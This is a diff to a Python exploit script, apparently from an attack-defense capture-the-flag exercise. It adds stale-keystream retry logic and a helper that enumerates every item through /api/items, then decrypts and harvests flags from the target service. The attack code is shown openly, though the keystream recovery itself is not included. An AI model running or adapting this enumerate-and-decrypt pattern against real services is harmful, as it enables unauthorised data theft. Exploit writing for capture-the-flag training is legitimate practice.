@@ -53,39 +53,44 @@ def _decrypt(base, item_id, ks):
     return FLAG_RE.findall(pt)
 
 
+def _targets(base, flag_id):
+    if flag_id is not None:
+        return [str(flag_id).strip()]
+    # no id given -> enumerate and dump every item
+    try:
+        items = requests.get(base + "/api/items", timeout=TIMEOUT).json().get("items", [])
+    except Exception:
+        items = []
+    return [str(it.get("id")) for it in items if isinstance(it, dict) and it.get("id")]
+
+
 def exploit(host, port, flag_id):
-    base = "http://%s:%d" % (host, port)
-    key = (host, port)
     flags, seen = [], set()
     try:
+        base = "http://%s:%s" % (host, port)      # %s: a non-int port returns [] instead of raising
+        key = (host, port)
+        from_cache = key in _KS
         ks = _KS.get(key) or _recover_ks(base)
         if not ks:
             return flags
         _KS[key] = ks
 
-        if flag_id is not None:
-            targets = [str(flag_id).strip()]
-        else:
-            # no id given -> enumerate and dump every item
-            try:
-                items = requests.get(base + "/api/items", timeout=TIMEOUT).json().get("items", [])
-            except Exception:
-                items = []
-            targets = [str(it.get("id")) for it in items if isinstance(it, dict) and it.get("id")]
-
-        for tid in targets:
-            got = _decrypt(base, tid, ks)
-            if not got and flag_id is not None and _KS.get(key) is ks:
-                # cached keystream may be stale (service restarted) -> re-recover once
-                fresh = _recover_ks(base)
-                if fresh:
-                    _KS[key] = fresh
-                    ks = fresh
-                    got = _decrypt(base, tid, ks)
-            for m in got:
-                if m not in seen:
-                    seen.add(m)
-                    flags.append(m)
+        # Try with the (possibly cached) keystream; if a cached one yields nothing it
+        # may be stale (the target box restarted with a new KEY) -> re-recover once and
+        # retry. Applies to BOTH the flag_id and the enumerate (flag_id=None) paths.
+        for attempt in range(2):
+            for tid in _targets(base, flag_id):
+                for m in _decrypt(base, tid, ks):
+                    if m not in seen:
+                        seen.add(m)
+                        flags.append(m)
+            if flags or not from_cache or attempt == 1:
+                break
+            fresh = _recover_ks(base)
+            if not fresh:
+                break
+            _KS[key] = ks = fresh
+            from_cache = False
     except Exception:
         return flags
     return flags
